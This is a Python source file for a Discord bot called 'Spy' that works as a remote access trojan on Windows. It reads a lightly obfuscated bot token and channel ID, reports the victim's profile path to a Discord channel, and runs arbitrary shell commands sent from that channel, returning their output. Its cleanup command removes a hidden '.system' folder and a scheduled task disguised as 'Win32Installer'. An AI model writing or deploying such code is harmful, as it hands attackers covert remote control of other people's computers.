import nextcord
from nextcord.ext import commands
import os
from shutil import rmtree
from asyncio import create_subprocess_shell, subprocess


class Spy:
    Bot = commands.Bot(intents=nextcord.Intents.all(), command_prefix='!')
    EncryptStep = None
    Channel = None
    ChannelID = None
    Target = os.environ['USERPROFILE']


    @staticmethod
    def Decrypt(string) -> str:
        return ''.join([chr(ord(c)-Spy.EncryptStep) for c in str(string)])

    @staticmethod
    def Run() -> None:
        Get = lambda k: os.environ.get(k)

        Spy.EncryptStep = int(Get("ENC"))
        Spy.ChannelID = int(Spy.Decrypt(Get("CHA")))
        
        Spy.Bot.run(Spy.Decrypt(Get("TOK")))

    @staticmethod
    async def Debug(msg) -> None:
        await Spy.Channel.send(f'```{msg}```')

    @staticmethod
    async def RunCommand(command) -> tuple:
        proc = await create_subprocess_shell(
            command, 
            shell=1, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        return tuple(map(lambda x: x.decode('utf-8').strip(), await proc.communicate()))

    @Bot.event
    async def on_ready():
        Spy.Channel = Spy.Bot.get_channel(Spy.ChannelID)
        await Spy.Channel.send(f'`Bot running from: {Spy.Target}`')

    @Bot.command()
    async def status(ctx) -> None:
        await Spy.Debug(f"Target: {Spy.Target}\nStatus: On")

    @Bot.command()
    async def cmd(ctx, *args) -> None:
        await Spy.Debug('\n\n'.join(await Spy.RunCommand(' '.join(args))).strip() or "No output")

    @Bot.command()
    async def clear(ctx) -> None:
        path = f'{Spy.Target}\\.system'

        try:
            if os.path.exists(path):
                rmtree(path)
                msg = f"{path} deleted successfully"
            else:
                msg = f"{path} does not exist"
        except:
            msg = f"Failed to deleted {path}"
        
        await Spy.Debug(msg)

        _, err = await Spy.RunCommand("schtasks /delete /tn Win32Installer /f")
        await Spy.Debug("Failed to delete task" if err else "Task deleted successfully")
